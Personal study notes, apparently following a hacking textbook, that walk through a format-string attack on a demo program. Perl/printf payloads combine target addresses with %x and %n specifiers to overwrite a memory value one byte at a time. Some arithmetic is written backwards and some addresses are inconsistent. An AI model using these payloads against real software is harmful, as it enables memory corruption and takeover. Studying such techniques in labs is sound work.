

There is a simple trick that makes sense that we can use to overwrite full memory addresses. We can see that we can usually overwrite the least significant bit the best, so what if we just have to do that?

By not aligning the memory to boundaries, and writing byte by byte we can easily overwrite one byte at a time. It’s easier to show:

![[Drawing 2023-07-08 12.01.02.excalidraw|700]]

# Calculating the first byte

First, let’s figure out what int it already writes to memory by doing:

```bash
./fmt_vuln `perl -e 'print "\x20\x90\x55\x56" . "%x%x%8x" . "%n"'`
```

We get: (address may not match up, ignore that.)

```bash
[*] test_val @ 0x08049794 = 28 0x0000001c
```

We can calculate how many characters we need by doing:

$$ NEEDED\_CHARACTERS - RESULT + FORMATSTRING\_CHARS$$
So

$$170 - 28 + 8 = 150$$
Meaning we need to add 150 characters to our format string.

```bash
./fmt_vuln `perl -e 'print "\x20\x90\x55\x56" . "%x%x%150x" . "%n"'`
```

Output:

```bash
[*] test_val @ 0x08049794 = 170 0x000000aa
```

# Overwriting more

Now let’s try overwriting more. We need to put the input text in this format:

__ADDRESS__JUNK__ADDRESS__JUNK … format strings

So let’s do this:
```bash
./fmt_vuln `printf "\x20\x90\x55\x56JUNK\x20\x90\x55\x57JUNK\x20\x90\x55\x58JUNK\x20\x90\x55\x59"`%x%x%8x%n
```

This will output something like:

```
[*] test_val @ 0x08049794 = 52 0x00000034
```

Let’s use our calculations again:

$$170-52+8=126$$

Let’s see what the output is with this value:

```bash
[*] test_val @ 0x08049794 = 170 0x000000aa
```

Ok so now we got this far, time to overwrite our new string.

I’m going to directly quote from _“Hacking the art of exploitation 2nd edition”_ on why the value changed from the first time:

```ad-quote
The addresses and junk data at the beginning of the format string changed the value of the necessary field width option for the `%x` format parameter. However, this is easily recalculated using the same method as before. Another way this could have been done is to subtract 24 from the previous field width value of 150, since 6 new 4-byte words have been added to the front of the format string.
```

Let’s first calculate what we have to set the width to. Keep in mind that we set up our memory to be aligned well with our first bytes, so now we just have to think according to that, meaning we just do:
`0xaa - 0xbb = 17` 

```ad-note
For easy calculations we can use gdb:
`gdb -q --batch -ex "p 0xbb - 0xcc"`
```

Our final payload:

```bash
./fmt_vuln `printf "\x20\x90\x55\x56JUNK\x20\x90\x55\x57JUNK\x20\x90\x55\x58JUNK\x20\x90\x55\x59"`%x%x%126x%n%17x%n%17x%n%17x%n
```

We don’t have to calculate anymore here, since we are always increasing with `17`. The output of this is: 

```bash
[*] test_val @ 0x08049794 = -573785174 0xddccbbaa
```

Eyy, we managed to overwrite a whole address, I’m proud 😄

